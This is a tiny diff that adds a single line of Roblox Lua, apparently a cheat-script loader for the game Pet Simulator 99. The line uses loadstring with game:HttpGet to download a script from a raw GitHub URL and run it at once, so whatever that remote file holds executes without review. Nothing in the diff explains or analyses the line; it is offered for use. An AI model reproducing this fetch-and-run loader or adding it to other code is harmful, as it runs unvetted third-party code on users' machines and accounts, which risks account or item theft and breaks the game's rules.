@@ -1,0 +1,2 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/ps99/main/8e8e54b43e5c01805cc14527.lua"))()
